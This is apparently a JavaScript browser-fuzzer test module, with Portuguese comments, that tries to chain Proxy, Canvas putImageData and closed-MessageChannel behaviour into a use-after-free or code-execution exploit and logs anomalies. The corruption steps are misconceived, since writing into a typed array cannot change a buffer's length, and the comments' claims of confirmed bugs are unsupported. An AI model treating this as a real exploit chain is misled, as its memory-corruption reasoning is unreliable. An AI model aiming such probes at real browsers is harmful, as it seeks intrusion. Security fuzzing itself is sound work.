\'use strict\';\n/**
 * Teste 15 — Chain Exploitation: Proxy + Canvas + MessageChannel
 *
 * Tentativa de encadear bugs confirmados para UAF/RCE:
 *   1. Proxy forEach/reverse: type confusion para corromper objeto
 *   2. Canvas putImageData OOB: corromper memória adjacente
 *   3. MessagePort closed state: UAF de ArrayBuffer
 *
 * Variantes:
 *   A — Proxy corrompe ArrayBuffer, Canvas OOB escreve nele
 *   B — MessageChannel transfer para porta fechada + Canvas OOB
 *   C — Proxy + MessageChannel race
 *   D — Full chain: Proxy → Canvas → MessageChannel
 */
(function (global) {
  global.FuzzerTests = global.FuzzerTests || {};

  global.FuzzerTests[\'15\'] = {
    id      : 15,
    name    : \'Chain Exploitation — Proxy + Canvas + MessageChannel\',
    category: \'Chain-Exploit\',
    timeout : 10000,

    run: function () {
      return new Promise(function (resolve) {
        var anomalies = [];

        /* ── Variante A: Proxy corrompe ArrayBuffer, Canvas OOB escreve ── */
        (function variantA() {
          try {
            var buffers = [];
            for (var i = 0; i < 20; i++) {
              var buf = new ArrayBuffer(64);
              var v = new Uint32Array(buf);
              v[0] = 0xCAFEBABE;
              v[1] = 64; /* length */
              buffers.push(buf);
            }

            /* Usar Proxy para tentar corromper o length de um buffer */
            var target = [1, 2, 3, 4, 5];
            var proxy = new Proxy(target, {
              set: function (t, prop, val, recv) {
                if (prop === \'4\') {
                  /* Tentar corromper o primeiro buffer */
                  var v = new Uint32Array(buffers[0]);
                  v[1] = 0xFFFFFFFF; /* length enorme */
                }
                return Reflect.set(t, prop, val, recv);
              }
            });

            proxy.forEach(function (v, i) {
              proxy[i] = v * 2;
            });

            /* Verificar se o buffer foi corrompido */
            var corrupted = false;
            for (var i = 0; i < buffers.length; i++) {
              if (buffers[i].byteLength !== 64) {
                corrupted = true;
                anomalies.push(\'A: ArrayBuffer[\' + i + \'] corrompido: length=\' + buffers[i].byteLength);
              }
            }

            /* Canvas OOB para tentar escrever nos buffers */
            if (!corrupted) {
              var canvas = document.createElement(\'canvas\');
              canvas.width = 4; canvas.height = 4;
              var ctx = canvas.getContext(\'2d\');
              var data = ctx.createImageData(256, 256);
              for (var i = 0; i < data.data.length; i++) data.data[i] = 0xFF;
              ctx.putImageData(data, -120, -120);

              for (var i = 0; i < buffers.length; i++) {
                var v = new Uint32Array(buffers[i]);
                if (v[0] !== 0xCAFEBABE) {
                  anomalies.push(\'A: ArrayBuffer[\' + i + \'] corrompido por Canvas OOB: 0x\' + v[0].toString(16));
                }
              }
            }
          } catch (e) {
            anomalies.push(\'A: \' + String(e));
          }
        }());

        /* ── Variante B: MessageChannel transfer fechada + Canvas ── */
        (function variantB() {
          try {
            var mc = new MessageChannel();
            mc.port1.start();
            var buf = new ArrayBuffer(1024);
            var view = new Uint8Array(buf);
            view[0] = 0xDE;

            mc.port1.close();

            try {
              mc.port1.postMessage(buf, [buf]);
            } catch (_) {}

            /* Se o buffer foi detached, tentar usar Canvas OOB para
             * escrever na memória liberada */
            if (buf.byteLength === 0) {
              var canvas = document.createElement(\'canvas\');
              canvas.width = 4; canvas.height = 4;
              var ctx = canvas.getContext(\'2d\');
              var data = ctx.createImageData(512, 512);
              for (var i = 0; i < data.data.length; i += 4) {
                data.data[i] = 0x41;
                data.data[i + 3] = 0xFF;
              }
              ctx.putImageData(data, -250, -250);

              anomalies.push(\'B: UAF tentativa — buffer detached, Canvas OOB executado\');
            }
          } catch (e) {
            anomalies.push(\'B: \' + String(e));
          }
        }());

        /* ── Variante C: Proxy + MessageChannel race ── */
        (function variantC() {
          try {
            var mc = new MessageChannel();
            mc.port1.start();
            mc.port2.start();

            var target = [1, 2, 3, 4, 5];
            var proxy = new Proxy(target, {
              set: function (t, prop, val, recv) {
                if (prop === \'2\') {
                  /* Fechar porta durante forEach */
                  mc.port1.close();
                }
                return Reflect.set(t, prop, val, recv);
              }
            });

            proxy.forEach(function (v, i) {
              proxy[i] = v * 2;
            });

            /* Tentar postMessage na porta fechada */
            try {
              mc.port1.postMessage(\'after-proxy-close\');
              anomalies.push(\'C: postMessage após close() durante Proxy forEach não lançou\');
            } catch (_) {}
          } catch (e) {
            anomalies.push(\'C: \' + String(e));
          }
        }());

        /* ── Variante D: Full chain test ── */
        (function variantD() {
          try {
            /* 1. Criar ArrayBuffer */
            var buf = new ArrayBuffer(256);
            var v = new Uint32Array(buf);
            v[0] = 0xBEEF;

            /* 2. Proxy corrompe */
            var target = [1, 2, 3, 4, 5];
            var proxy = new Proxy(target, {
              set: function (t, prop, val, recv) {
                if (prop === \'4\') {
                  v[1] = 0xFFFFFFFF;
                }
                return Reflect.set(t, prop, val, recv);
              }
            });
            proxy.forEach(function (v, i) { proxy[i] = v * 2; });

            /* 3. Canvas OOB */
            var canvas = document.createElement(\'canvas\');
            canvas.width = 4; canvas.height = 4;
            var ctx = canvas.getContext(\'2d\');
            var data = ctx.createImageData(256, 256);
            for (var i = 0; i < data.data.length; i++) data.data[i] = 0xFF;
            ctx.putImageData(data, -120, -120);

            /* 4. MessageChannel */
            var mc = new MessageChannel();
            mc.port1.start();
            mc.port1.close();
            try { mc.port1.postMessage(buf, [buf]); } catch (_) {}

            anomalies.push(\'D: full chain executado sem crash\');
          } catch (e) {
            anomalies.push(\'D: \' + String(e));
          }
        }());

        setTimeout(function () {
          if (anomalies.length > 0) {
            resolve({ status: \'ANOMALY\', detail: anomalies.join(\' | \') });
          } else {
            resolve({ status: \'PASS\', detail: \'A-D sem anomalias\' });
          }
        }, 1000);
      });
    }
  };

}(window));